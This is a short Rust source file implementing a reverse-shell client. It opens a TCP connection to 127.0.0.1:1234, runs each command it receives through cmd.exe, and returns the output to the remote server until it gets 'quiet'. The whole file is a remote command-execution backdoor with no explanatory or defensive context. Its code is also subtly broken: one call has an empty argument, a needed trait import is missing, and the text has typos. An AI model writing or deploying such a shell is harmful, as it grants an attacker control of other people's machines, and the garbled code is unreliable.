use std::env;
use std::net::{Ipv4Addr, SocketAddrV4, TcpListener, TcpStream, Shutdown};
use std::process::{Command, exit};
use std::io::{self, Write, BufReader};


fn exeCmd(cmd: &str) -> String {
    let temp = "/c ".to_owned();
    let fullcmd = temp + cmd;

    let cmds: Vec<&str> = fullcmd.split(" ").collect();
    let res = Command::new("cmd.exe").args(&cmds).output().unwrap();

    let stdout = String::from_utf8_lossy(res.stdout.as_slice());
    let stderr = String::from_utf8_lossy(res.stderr.as_slice());

    if stdout.len() > 0 {
        return stdout.to_string();
    } else {
        return stderr.to_string();
    }
}

fn main() {
    let mut client = TcpStream::connect("127.0.0.1:1234").unwrap();
    println!("Connectd to: {}", client.peer_addr().unwrap());
    
    loop {
        let mut buffer:Vec<u8> = Vec::new();
        let mut reader = BufReader::new(&client);
        reader.read_until(b'\0', &mut buffer);

        println!("received from server: {}", String::from_utf8_lossy((&buffer)));
        
        if buffer.len() == 0 ||
        String::from_utf8_lossy(&buffer).trim_end_matches('\0') == "quiet" {
            break;
        }
        let mut output = exeCmd(String::from_utf8_lossy(&));
        output.push('\0');
        client.write(&mut output.as_bytes());
    }

    client.shutdown(Shutdown::Both);
}
